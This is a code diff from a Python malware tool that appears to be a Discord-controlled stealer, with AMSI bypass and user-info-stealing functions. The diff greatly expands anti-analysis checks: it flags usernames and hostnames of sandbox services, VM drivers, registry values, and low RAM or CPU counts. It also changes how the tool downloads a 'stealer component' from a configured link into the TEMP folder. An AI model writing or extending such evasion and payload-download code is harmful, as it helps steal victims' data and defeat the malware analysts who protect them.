@@ -146,24 +146,40 @@ def bypass_amsi():
         )
     except:
         pass
-
-# Anti-VM detection
 def check_virtual_machine():
     try:
-        virtualization_strings = ['vmware', 'virtualbox', 'vbox', 'qemu', 'xen', 'parallels']
+        virtualization_strings = ['vmware', 'virtualbox', 'vbox', 'qemu', 'xen', 'parallels', 'hyper-v', 'virtual', 'sandbox', 'cuckoo', 'wine', 'docker']
+        sandbox_users = ['admin', 'john doe', 'sandbox', 'emily', 'test', 'maltest', 'virus', 'malware', 'test123', 'anyrun', 'triage', 'hybrid', 'virustotal', 'virus_total', 'cuckoo', 'james', 'peter wilson', 'joe', 'mary', 'analysis']
+        sandbox_hostnames = ['sandbox', 'virus', 'malware', 'test-pc', 'triage', 'anyrun', 'cuckoo', 'vbox', 'vm-', 'virtual']
         
-        for proc in psutil.process_iter(['name']):
+        username = os.getenv('USERNAME', '').lower()
+        hostname = socket.gethostname().lower()
+        
+        for user in sandbox_users:
+            if user in username:
+                return True
+                
+        for host in sandbox_hostnames:
+            if host in hostname:
+                return True
+                
+        for proc in psutil.process_iter(['name', 'username']):
             try:
                 for v_string in virtualization_strings:
                     if v_string in proc.info['name'].lower():
                         return True
+                if proc.info['username']:
+                    for user in sandbox_users:
+                        if user in proc.info['username'].lower():
+                            return True
             except:
                 pass
                 
         try:
             manufacturer = subprocess.check_output('wmic computersystem get manufacturer', shell=True).decode().lower()
+            model = subprocess.check_output('wmic computersystem get model', shell=True).decode().lower()
             for v_string in virtualization_strings:
-                if v_string in manufacturer:
+                if v_string in manufacturer or v_string in model:
                     return True
         except:
             pass
@@ -172,29 +188,47 @@ def check_virtual_machine():
             reg_paths = [
                 r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0",
                 r"HARDWARE\Description\System",
-                r"SYSTEM\CurrentControlSet\Control\SystemInformation"
+                r"SYSTEM\CurrentControlSet\Control\SystemInformation",
+                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion",
+                r"SYSTEM\CurrentControlSet\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000",
+                r"SYSTEM\CurrentControlSet\Services\Disk\Enum"
             ]
             
             for path in reg_paths:
                 try:
                     key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
-                    try:
-                        value, _ = winreg.QueryValueEx(key, "SystemBiosVersion")
-                        for v_string in virtualization_strings:
-                            if v_string in value.lower():
-                                return True
-                    except:
-                        pass
-                    
-                    try:
-                        value, _ = winreg.QueryValueEx(key, "Identifier")
-                        for v_string in virtualization_strings:
-                            if v_string in value.lower():
-                                return True
-                    except:
-                        pass
+                    for i in range(0, winreg.QueryInfoKey(key)[1]):
+                        try:
+                            name, value, _ = winreg.EnumValue(key, i)
+                            if isinstance(value, str):
+                                for v_string in virtualization_strings:
+                                    if v_string in value.lower():
+                                        return True
+                        except:
+                            pass
                 except:
                     pass
+                    
+        except:
+            pass
+            
+        try:
+            if os.path.exists("C:\\Windows\\System32\\Drivers\\Vmmouse.sys") or \
+               os.path.exists("C:\\Windows\\System32\\Drivers\\vm3dgl.dll") or \
+               os.path.exists("C:\\Windows\\System32\\Drivers\\vmdum.dll") or \
+               os.path.exists("C:\\Windows\\System32\\Drivers\\VBoxMouse.sys"):
+                return True
+        except:
+            pass
+            
+        try:
+            ram = psutil.virtual_memory().total
+            if ram < 4 * 1024 * 1024 * 1024:  
+                return True
+            
+            cpu_count = psutil.cpu_count()
+            if cpu_count < 2:
+                return True
         except:
             pass
             
@@ -372,11 +406,10 @@ link = None
 pid_process = None 
 loop = asyncio.new_event_loop()  
 asyncio.set_event_loop(loop)  
-
 async def steal_user_info():
     try:
-        global link
-        if not link:
+        global pkq
+        if not pkq:
             return "Error: Stealer link not configured"
             
         temp_dir = os.environ.get('TEMP')
@@ -386,7 +419,7 @@ async def steal_user_info():
         try:
             await message.channel.send("[*] Downloading stealer component...")
             await asyncio.wait_for(
-                asyncio.to_thread(urllib.request.urlretrieve, link, exe_path),
+                asyncio.to_thread(urllib.request.urlretrieve, pkq, exe_path),
                 timeout=60  # 60 second timeout for download
             )
         except asyncio.TimeoutError:
